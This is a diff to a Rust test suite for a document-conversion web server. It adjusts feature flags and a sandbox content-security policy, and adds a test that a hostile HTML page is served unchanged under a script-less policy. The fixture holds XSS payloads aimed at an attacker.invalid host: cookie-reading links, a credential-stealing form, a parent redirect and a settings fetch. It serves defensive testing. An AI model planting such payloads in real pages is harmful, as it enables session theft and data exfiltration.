@@ -452,7 +452,8 @@ fn an_uploaded_pdf_is_described_drawn_and_read_by_line() {
         capabilities["features"],
         json!({"cancel":true,"download_tickets":true,"url_lists":true,"history_items":true,
             "original":true,"result_excerpt":true,"job_labels":true,"item_assets":true,
-            "item_archive":true,"token_regenerate":false})
+            "item_archive":true,"token_regenerate":false,"user_tokens":false,
+            "config_edit":true,"batch_delete":true})
     );
     let id = server.submit(&[("report.pdf", PDF)], json!([]), json!({}))["job_id"]
         .as_str()
@@ -1003,7 +1004,7 @@ fn a_kept_html_page_is_framed_with_its_base_and_a_closed_policy() {
         ("content-type", "text/html; charset=utf-8"),
         (
             "content-security-policy",
-            "sandbox allow-popups allow-popups-to-escape-sandbox; default-src 'none'; img-src https: data:; style-src https: 'unsafe-inline'; font-src https: data:; media-src https:; form-action 'none'; frame-ancestors 'self'",
+            "sandbox allow-same-origin allow-popups allow-popups-to-escape-sandbox; default-src 'none'; img-src https: data:; style-src https: 'unsafe-inline'; font-src https: data:; media-src https:; form-action 'none'; frame-ancestors 'self'",
         ),
         ("x-content-type-options", "nosniff"),
         ("referrer-policy", "no-referrer"),
@@ -1122,5 +1123,112 @@ fn a_url_page_with_screenshots_offers_both_and_a_large_page_is_not_framed() {
         (reply.status, reply.json()["reason"].clone()),
         (413, json!("result_too_large"))
     );
+    server.stop();
+}
+
+/// The framed page keeps the workbench's origin (`allow-same-origin`) and so
+/// must stay script-less by policy alone: the server does not rewrite a kept
+/// page. The round's browser harness (a real Chromium) confirmed that none of
+/// the hostile markup below runs, navigates, submits or embeds anything under
+/// this policy; this test pins the policy and the untouched page.
+#[test]
+fn a_hostile_kept_page_is_served_verbatim_under_a_script_less_same_origin_policy() {
+    let temp = tempfile::tempdir().unwrap();
+    configure(temp.path());
+    let id = "00000000abcf";
+    let folder = temp.path().join("home/serve/jobs").join(id);
+    std::fs::create_dir_all(folder.join("out")).unwrap();
+    std::fs::create_dir_all(folder.join("snapshots")).unwrap();
+    std::fs::write(folder.join("out/page.md"), "# Page\n").unwrap();
+    let hostile = concat!(
+        "<!DOCTYPE html><html><head><title>Hostile</title>",
+        "<meta http-equiv=\"refresh\" content=\"0;url=https://attacker.invalid/\">",
+        "<script>parent.document.title='owned'</script>",
+        "<script src=\"https://attacker.invalid/x.js\"></script>",
+        "</head><body onload=\"fetch('/api/settings/llm')\">",
+        "<img src=\"x\" onerror=\"parent.location='https://attacker.invalid/'\">",
+        "<a href=\"javascript:alert(document.cookie)\">link</a>",
+        "<form action=\"https://attacker.invalid/steal\" method=\"post\"><input name=\"q\"></form>",
+        "<iframe src=\"https://attacker.invalid/frame\"></iframe>",
+        "<object data=\"https://attacker.invalid/plugin\"></object>",
+        "</body></html>"
+    );
+    std::fs::write(folder.join("snapshots/i1.html"), hostile).unwrap();
+    let item = json!({"item_id":"i1","name":"https://example.test/page","kind":"url","status":"done",
+        "output":"page.md","output_name":"page.md"});
+    let meta = json!({"job_id":id,"created_at":hours_ago(1),"finished_at":hours_ago(1),"status":"done",
+        "version":2,"options":{},"items":[item],"native_bases":{"i1":"page"},"native_assets":{"i1":[]}});
+    std::fs::write(folder.join("meta.json"), meta.to_string()).unwrap();
+    let server = Server::start(temp.path());
+    let view = server.request(
+        "GET",
+        &format!("/api/jobs/{id}/items/i1/original/view"),
+        &[],
+        &[],
+    );
+    assert_eq!(view.status, 200, "{}", view.text());
+    let policy = view.headers["content-security-policy"].clone();
+    assert_eq!(
+        policy,
+        "sandbox allow-same-origin allow-popups allow-popups-to-escape-sandbox; default-src 'none'; img-src https: data:; style-src https: 'unsafe-inline'; font-src https: data:; media-src https:; form-action 'none'; frame-ancestors 'self'"
+    );
+    let directives: HashMap<&str, Vec<&str>> = policy
+        .split(';')
+        .map(|directive| {
+            let mut parts = directive.split_whitespace();
+            (parts.next().unwrap(), parts.collect())
+        })
+        .collect();
+    let sandbox: std::collections::BTreeSet<_> = directives["sandbox"].iter().copied().collect();
+    assert_eq!(
+        sandbox,
+        [
+            "allow-popups",
+            "allow-popups-to-escape-sandbox",
+            "allow-same-origin"
+        ]
+        .into_iter()
+        .collect()
+    );
+    for absent in [
+        "script-src",
+        "script-src-elem",
+        "script-src-attr",
+        "frame-src",
+        "child-src",
+        "object-src",
+        "connect-src",
+        "worker-src",
+        "base-uri",
+    ] {
+        assert!(!directives.contains_key(absent), "{absent} in {policy}");
+    }
+    for keyword in [
+        "unsafe-eval",
+        "unsafe-hashes",
+        "wasm-unsafe-eval",
+        "allow-scripts",
+        "allow-forms",
+        "allow-top-navigation",
+        "allow-modals",
+    ] {
+        assert!(!policy.contains(keyword), "{keyword} in {policy}");
+    }
+    assert_eq!(directives["default-src"], ["'none'"]);
+    assert_eq!(directives["form-action"], ["'none'"]);
+    assert_eq!(directives["frame-ancestors"], ["'self'"]);
+    for (name, value) in [
+        ("x-content-type-options", "nosniff"),
+        ("referrer-policy", "no-referrer"),
+        ("cache-control", "no-store"),
+        ("content-disposition", "inline"),
+    ] {
+        assert_eq!(view.headers[name], value, "{name}");
+    }
+    // Only the one insertion; every hostile part is still there, unchanged.
+    let inserted = "<meta http-equiv=\"x-dns-prefetch-control\" content=\"off\"><base href=\"https://example.test/page\" target=\"_blank\">";
+    let body = view.text();
+    assert_eq!(body.replacen(inserted, "", 1), hostile);
+    assert!(body.starts_with(&format!("<!DOCTYPE html><html><head>{inserted}<title>")));
     server.stop();
 }
